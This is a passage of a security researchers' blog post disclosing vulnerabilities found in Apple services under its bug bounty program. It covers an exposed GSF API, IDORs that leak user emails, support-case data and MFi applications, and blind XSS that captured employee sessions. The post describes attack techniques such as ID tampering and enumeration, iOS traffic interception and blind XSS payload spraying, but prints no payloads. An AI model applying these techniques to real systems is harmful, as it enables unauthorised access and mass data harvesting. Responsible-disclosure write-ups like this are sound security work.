                                                                                It was quickly apparent that the GSF API had access to the “GSF” module that exposed a lot of information about GSF applets. This included some API endpoints for pulling cluster data, application data, and possibly even deploying new clusters and applications.
                                                                            </p><p>
                                                                                We speculate at this point we would have been able to deploy internal APIs to the public-facing &#34;/gsf/ &#34;in this cluster giving us access to sensitive data. However, we didn’t prove it out due to the risk. We reported it and stopped here.
                                                                            </p><p>
                                                                                Overall, an attacker could&#39;ve abused this to...
                                                                            </p><ul><li>Likely compromise the various internal applications via the publicly exposed GSF portal</li><li>Execute arbitrary Vertica SQL queries and extract database information</li></ul><h2>
                                                                                Various IDOR Vulnerabilities
                                                                            </h2><p>
                                                                                Throughout testing on Apple we discovered a variety of IDORs affecting different parts of Apple. The first one was found within the app store connect application that was used to manage apps on the app store.
                                                                            </p><h4>
                                                                                App Store Connect
                                                                            </h4><p>
                                                                                After signing up for the developer service, the first thing we did was explore the App Store Connect application which let developers manage their apps that they had or planned to release to the app store.
                                                                            </p><p>
                                                                                Hidden behind a few hyperlinks from the settings page was a setting to enable the Game Center for the application. This would allow you to create leader-boards and manage locales for your application. If you enabled this, you were redirected to a more older looking page which used a new set of identifiers to manage the new game center/locale settings you can add to your app.
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/game_center.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/game_center.png 911w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/game_center-300x180.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/game_center-768x462.png 768w" sizes="(max-width: 911px) 100vw, 911px"/></figure><p>
                                                                                There was an &#34;itemId&#34; parameter being sent in the URL which was a numeric value that defined which app settings you were modifying. By modifying the number, we could access and modify the leader-boards of any app. This would allow an attacker to deface or remove entirely the game center settings from the app.
                                                                            </p><p>
                                                                                    Overall, an attacker could&#39;ve abused this to...
                                                                                </p><ul><li>View and modify metadata of any apps on the app store</li><li>Change data within any application&#39;s Game Center information page</li></ul><h4>
                                                                                iCloud Find my Friends IDOR
                                                                            </h4><p>
                                                                                The iCloud service has a functionality where parents can create and manage child accounts through their primarily Apple account. This behavior was super interesting because of the parent/child relationship and permission model within the application.
                                                                            </p><figure><img loading="lazy" src="https://i.imgur.com/vEsL71l.jpg" alt=""/></figure><p>
                                                                                If a parent created or added a child account they would have immediate access to perform certain actions against the sub-account like checking the location of the child’s device, limiting device usage, and viewing stored photos and videos. The user management was primarily done through the iOS app which you weren’t able to intercept without finding an SSL pinning bypass, so we decided to look at the other applications like Find my Friends and Photos which integrated sub-functionality for the parent/child relationship.
                                                                            </p><figure><img loading="lazy" src="https://i.imgur.com/AFPQ142.jpg" alt=""/></figure><p>
                                                                                There were functionalities under “Find my Friends” where you could select your family members then click “Share My Location” and, since it was a trusted relationship between family members, immediately share your location with the family member without them having to accept the request and without the ability to remove your shared presence from their app. Luckily enough for us, this HTTP request to perform the action was interceptable and we could see what the arguments looked like.
                                                                            </p><figure><img loading="lazy" src="https://i.imgur.com/TYuiAJJ.png" alt=""/></figure><p>
                                                                                The “dsIds” JSON parameter was used as an array of user IDs to share your location. Within the HTTP response, the family members email was returned. I went ahead and modified this value to another user’s ID and to my surprise received their email.
                                                                            </p><p>
                                                                                This IDOR would allow us to enumerate the core identifier for Apple accounts to retrieve customer emails and irrevocably share our location with the victim user IDs in which we could send notifications and request access to their location. Since the parameter was sent via a JSON array, you could request hundreds of identifiers at a time and easily enumerate a massive amount of user IDs belonging to Apple customers.
                                                                            </p><figure><img loading="lazy" src="https://i.imgur.com/oAD5p2S.jpg" alt=""/></figure><p>
                                                                                    Overall, an attacker could&#39;ve abused this to...
                                                                                </p><ul><li>Retrieve any Apple users email address via an incremental numeric identifier permanently tied to their account</li><li>Associate the attacker&#39;s Apple account with the victim&#39;s so that the attacker can send them notifications, show their own location within the victim&#39;s phone, and not be deleted from their Find my Friends page</li></ul><h4>
                                                                                Support Case IDOR
                                                                            </h4><p>
                                                                                One of the more challenging parts of figuring out what to hack on was intercepting the iOS HTTP traffic. There were a lot of really interesting apps and APIs on the actual device, but many of the domains belonging to Apple were SSL pinned and none of us had a strong enough mobile background nor the significant amount of time required to pick apart the actual iOS device.
                                                                            </p><p>
                                                                                People have achieved this in the past and been able to intercept all of the HTTP traffic, but luckily for us, a huge portion of the traffic was still interceptable within various apps if you set up your proxy in a certain way.
                                                                            </p><p>
                                                                                The way in which we did this was setting up the Burp proxy, installing the certificate, then connecting to the WiFi which had the Burp Proxy enabled whenever we got to a page that we wanted to try to intercept. An example of this would be the failure to load the core App Store while proxying all HTTP requests, but ability to load the app store while not proxying, navigating to the correct sub-page you want to intercept, then enabling the proxy at that point.
                                                                            </p><p>
                                                                                This allowed us to capture many API calls for the Apple owned apps that were installed by default on the iPhone. One of these was a support app for scheduling support or speaking with a live chat agent.
                                                                            </p><p>
                                                                                From intercepting these, there were a few very obvious IDORs from multiple endpoints that would reveal metadata about support case details. You were able to retrieve information about the victim’s support case details (what support they had requested, their device serial number, their user ID) and additionally a token that appeared to be used when requesting live chat with support agents.
                                                                            </p><p>
                                                                                Overall, an attacker could&#39;ve abused this to...
                                                                            </p><ul><li>Leak support case metadata like device serial number and support information for all apple support cases</li></ul><h4>
                                                                                IDOR on mfi.apple.com
                                                                            </h4><p>
                                                                                Another application that we spent a lot of time on was “mfi.apple.com”. This service was designed for employees of companies that produced third party electronic accessories that interfaced with the iPhone to retrieve documentation and support for their manufacturing process.
                                                                            </p><p>
                                                                                After filling out the application, we observed an HTTP request being sent to “getReview.action” with a numeric ID parameter. We went ahead and incremented the parameter via minus one and observed we could access another company&#39;s application.
                                                                            </p><p>
                                                                                The application returned nearly every value provided for the company application including names, emails, addresses, and invitation keys which could be used to join the company. A simple estimate based on our most recent ID and the base ID indicated around 50,000 different retrievable applications through this vulnerability.
                                                                            </p><p>
                                                                                Overall, an attacker could&#39;ve abused this to...
                                                                            </p><ul><li>Leak the entire account information for anyone who has applied to use Apple&#39;s MFi portal</li></ul><h2>
                                                                                Various Blind XSS Vulnerabilities
                                                                            </h2><p>
                                                                                With nearly every application encountered we made sure to spray as many blind XSS payloads as possible. This lead to some very interesting vulnerabilities affecting applications like...
                                                                            </p><ul><li>Employee session access within an internal app for managing Apple Maps address information</li><li>Employee session access within an internal app for managing Apple Books publisher information</li><li>Employee session access within an internal app for managing Apple Store and customer support tickets</li></ul><p>
                                                                                These findings were very typical blind XSS as we&#39;d found them by submitting payloads within an address field, Apple Books book submission title, and lastly our first and last name.
                                                                            </p><p>
                                                                                The internal applications were very interesting and all appeared to have a comfortable level of access since they fired within the context of Apple employee management tools. We were able to act on the behalf of someone who was expected to be logged in from either a VPN or an on-site location to manage user and system information.
                                                                            </p><p>
                                                                                The following screenshots show the redacted panels that we were able to exfiltrate via HTML5 DOM screenshots through XSS hunter:
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/3-1024x614.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/3-1024x614.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/3-300x180.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/3-768x460.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/3.png 1462w" sizes="(max-width: 1024px) 100vw, 1024px"/></figure><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/2-1024x671.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/2-1024x671.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/2-300x197.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/2-768x504.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/2.png 1339w" sizes="(max-width: 1024px) 100vw, 1024px"/></figure><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/bookinfo-1024x517.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/bookinfo-1024x517.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/bookinfo-300x151.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/bookinfo-768x388.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/bookinfo-1536x775.png 1536w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/bookinfo-1600x808.png 1600w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/bookinfo.png 1702w" sizes="(max-width: 1024px) 100vw, 1024px"/></figure><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/1-1024x667.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/1-1024x667.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/1-300x196.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/1-768x501.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/1.png 1341w" sizes="(max-width: 1024px) 100vw, 1024px"/></figure><p>
                                                                                Since the applications were internal and we weren&#39;t actual attackers we stopped here at each finding. These applications would&#39;ve allowed an attacker to at the very least exfiltrate a large amount of sensitive information regarding internal Apple logistics and employees/users.
                                                                            </p><h2>
                                                                            Conclusion
                                                                        </h2><p>
                                                                            When we first started this project we had no idea we&#39;d spend a little bit over three months working towards it&#39;s completion. This was originally meant to be a side project that we&#39;d work on every once in a while, but with all of the extra free time with the pandemic we each ended up putting a few hundred hours into it.
                                                                        </p><p>
                                                                            Overall, Apple was very responsive to our reports. The turn around for our more critical reports was only four hours between time of submission and time of remediation.
                                                                        </p><p>
                                                                            Since no-one really knew much about their bug bounty program, we were pretty much going into unchartered territory with such a large time investment. Apple has had an interesting history working with security researchers, but it appears that their vulnerability disclosure program is a massive step in the right direction to working with hackers in securing assets and allowing those interested to find and report vulnerabilities.
                                                                        </p><p>
                                                                            Writing this blog post has been an interesting process as we were a bit unsure how to actually go about doing it. To be honest, each bug we found could&#39;ve probably been turned into a full writeup with how much random information there was. The authentication system Apple uses was fairly complex and to reference it with 1-2 sentences felt as if we were cheating someone out of information. The same thing could be said about many elements within Apple&#39;s infrastructure like iCloud, the Apple store, and the Developer platform.
                                                                        </p><p>
                                                                            As of now, October 8th, we have received 32 payments totaling $288,500 for various vulnerabilities.
                                                                        </p><p>
                                                                            However, it appears that Apple does payments in batches and will likely pay for more of the issues in the following months.
                                                                        </p><p>
                                                                            We&#39;ve obtained permission from the Apple security team (product-security@apple.com) to publish this and are doing so under their discretion. All of the vulnerabilities disclosed here have been fixed and re-tested. Please do not disclose information pertaining to Apple&#39;s security without their permission.
                                                                        </p><h2>
                                                                            Supporting Resources
                                                                        </h2><ul><li><a href="https://developer.apple.com/security-bounty">https://developer.apple.com/security-bounty</a> - Apple Security Bounty Information Page</li><li><a href="https://support.apple.com/en-us/HT201536">https://support.apple.com/en-us/HT201536</a> - Apple Web Security Notifications</li><li><a href="https://support.apple.com/en-us/HT201222">https://support.apple.com/en-us/HT201222</a> - Apple Security Updates</li><li><a href="http://lists.apple.com/mailman/listinfo/security-announce/">http://lists.apple.com/mailman/listinfo/security-announce/</a> - Apple Security Mailing List</li></ul><h2>
                                                                            Addendum
                                                                        </h2><p>
                                                                            Huge thanks to the following people:
                                                                        </p><ul><li>Kane Gamble</li><li>Nick Wright (<a href="https://twitter.com/FaIIenGhouI">@FaIIenGhouI</a>) for the cover photo</li><li>Jack Cable</li><li>Dan Ritter</li><li>Nathanial Lattimer</li><li>Jasraj Bedi</li><li>Justin Rhinehart</li><li>Everyone on the Apple product security team who have been incredibly responsive and involved with our submissions</li></ul><p>
                                                                            If you made it this far, thanks for reading! Feel free to reach out with any questions or comments at admin(at)samcurry.net or using the contact form.
                                                                        </p></div>